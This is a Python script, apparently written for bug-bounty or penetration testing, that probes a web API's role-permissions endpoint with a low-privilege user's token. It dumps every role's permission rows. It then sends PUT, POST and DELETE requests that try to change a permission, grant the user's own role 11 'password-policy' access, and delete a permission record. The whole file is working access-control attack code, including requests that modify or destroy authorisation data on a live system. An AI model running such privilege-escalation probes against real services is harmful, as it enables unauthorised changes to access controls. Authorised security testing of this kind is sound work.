import json,subprocess,os
from collections import Counter
H=os.environ['H']; BB=os.environ['BB']
TPU=open('/tmp/bac_TPU').read().strip()
def get(path,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}',H+path,'-H','token: '+(tok or TPU),'-H',BB]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
c,b=get('/api/v1/role_permissions')
d=json.loads(b)
rp=d['role_permissions']
print(f"TPU GET role_permissions -> {c}, {len(rp)} rows, {len(b)} bytes")
print("keys per row:",sorted(rp[0].keys()))
print("\nrows by role_id:",dict(Counter(r['role_id'] for r in rp)))
print("distinct permissions:",len(set(r['key'] for r in rp)))
print("\nsample rows:")
for r in rp[:5]:
    print(f"   role={r['role_id']:>2} key={r['key']:28} section={str(r['section'])[:20]:22} value={r['value']}")
print("\n=== what does TPU's OWN role 11 look like (does it leak its own limits)? ===")
r11=[r for r in rp if r['role_id']==11]
print(f"  role 11 rows: {len(r11)}")
for r in r11[:6]:
    print(f"   {r['key']:28} {r['value']}")
print("\n=== is any role's permission set WRITABLE by TPU? ===")
for m,p,body in [('PUT','/api/v1/role_permissions/22285',{"role_permission":{"value":"show"}}),
                 ('POST','/api/v1/role_permissions',{"role_permission":{"role_id":11,"key":"password-policy","value":"show"}}),
                 ('DELETE','/api/v1/role_permissions/22285',None)]:
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+TPU,'-H',BB,'-H','Content-Type: application/json']
    if body: cmd+=['-d',json.dumps(body)]
    cc=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    print(f"  {cc} {m} {p}  {open('/tmp/b',encoding='utf-8',errors='replace').read()[:120]}")
